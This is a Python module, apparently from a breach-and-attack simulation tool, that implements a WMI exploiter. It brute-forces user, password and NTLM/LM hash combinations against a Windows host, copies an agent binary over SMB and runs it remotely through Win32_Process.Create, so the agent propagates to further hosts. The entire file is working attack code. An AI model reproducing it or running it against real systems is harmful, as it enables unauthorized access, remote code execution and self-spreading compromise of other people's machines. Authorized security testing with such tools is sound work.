import logging
import ntpath
import socket
import traceback
from time import time

from impacket.dcerpc.v5.rpcrt import DCERPCException

from common.credentials import get_plaintext
from common.tags import (
    T1021_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
)
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.exploit.tools.wmi_tools import AccessDeniedException, WmiTools
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_CMDLINE_WINDOWS, MONKEY_CMDLINE_WINDOWS
from infection_monkey.utils.brute_force import (
    generate_brute_force_combinations,
    get_credential_string,
)
from infection_monkey.utils.commands import DROPPER_TARGET_PATH_WIN64, build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)

WMI_EXPLOITER_TAG = "wmi-exploiter"


class WmiExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "WMI (Windows Management Instrumentation)"

    _EXPLOITER_TAGS = (WMI_EXPLOITER_TAG, T1021_ATTACK_TECHNIQUE_TAG, T1110_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (WMI_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    @WmiTools.impacket_user
    @WmiTools.dcom_wrap
    def _exploit_host(self) -> ExploiterResultData:
        creds = generate_brute_force_combinations(self.options["credentials"])
        intp_creds = interruptible_iter(
            creds,
            self.interrupt,
            "WMI exploiter has been interrupted",
            logging.INFO,
        )

        for user, password, lm_hash, ntlm_hash in intp_creds:
            creds_for_log = get_credential_string([user, password, lm_hash, ntlm_hash])
            logger.debug(f"Attempting to connect to {self.host} using WMI with {creds_for_log}")

            wmi_connection = WmiTools.WmiConnection()

            timestamp = time()
            try:
                wmi_connection.connect(
                    self.host,
                    user,
                    get_plaintext(password),
                    None,
                    get_plaintext(lm_hash),
                    get_plaintext(ntlm_hash),
                )
            except AccessDeniedException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                error_message = f"Failed connecting to {self.host} using WMI"
                logger.debug(error_message)
                self._publish_exploitation_event(timestamp, False, error_message=error_message)
                continue
            except DCERPCException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                error_message = f"Failed connecting to {self.host} using WMI"
                logger.debug(error_message)
                self._publish_exploitation_event(timestamp, False, error_message=error_message)
                continue

            except socket.error:
                error_message = f"Network error in WMI connection to {self.host}"
                logger.debug(error_message)
                self._publish_exploitation_event(timestamp, False, error_message=error_message)
                return self.exploit_result

            except Exception as exc:
                error_message = (
                    f"Unknown WMI connection error to {self.host}: "
                    f"{exc} {traceback.format_exc()}"
                )
                logger.debug(error_message)
                self._publish_exploitation_event(timestamp, False, error_message=error_message)
                return self.exploit_result

            self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
            self.exploit_result.exploitation_success = True
            self._publish_exploitation_event(timestamp, True)

            downloaded_agent = self.agent_binary_repository.get_agent_binary(
                self.host.operating_system
            )

            if self._is_interrupted():
                return self.exploit_result

            target_path = get_agent_dst_path(self.host)

            propagation_timestamp = time()
            remote_full_path = SmbTools.copy_file(
                self.host,
                downloaded_agent,
                target_path,
                user,
                password,
                lm_hash,
                ntlm_hash,
                self.options["smb_download_timeout"],
            )

            if not remote_full_path:
                wmi_connection.close()
                error_message = "No agent has been uploaded to the victim."
                self._publish_propagation_event(
                    propagation_timestamp, False, error_message=error_message
                )
                return self.exploit_result
            # execute the remote dropper in case the path isn't final
            elif remote_full_path.lower() != DROPPER_TARGET_PATH_WIN64:
                cmdline = DROPPER_CMDLINE_WINDOWS % {
                    "dropper_path": remote_full_path
                } + build_monkey_commandline(
                    self.agent_id,
                    self.servers,
                    self.current_depth + 1,
                    DROPPER_TARGET_PATH_WIN64,
                )
            else:
                cmdline = MONKEY_CMDLINE_WINDOWS % {
                    "monkey_path": remote_full_path
                } + build_monkey_commandline(self.agent_id, self.servers, self.current_depth + 1)

            # execute the remote monkey
            result = WmiTools.get_object(wmi_connection, "Win32_Process").Create(
                cmdline, ntpath.split(remote_full_path)[0], None
            )

            if (0 != result.ProcessId) and (not result.ReturnValue):
                logger.info(
                    f"Executed dropper '{remote_full_path}' on remote victim {self.host} "
                    f"(pid={result.ProcessId}, cmdline={cmdline})"
                )

                self.add_vuln_port(port="unknown")
                self.exploit_result.propagation_success = True
                self._publish_propagation_event(propagation_timestamp, True)
            else:
                error_message = (
                    f"Error executing dropper '{remote_full_path}' on remote victim {self.host} "
                    f"(pid={result.ProcessId}, exit_code={result.ReturnValue}, cmdline={cmdline})"
                )
                logger.debug(error_message)
                self.exploit_result.error_message = error_message
                self._publish_propagation_event(
                    propagation_timestamp, False, error_message=error_message
                )

            result.RemRelease()
            wmi_connection.close()
            self.add_executed_cmd(cmdline)
            return self.exploit_result

        return self.exploit_result
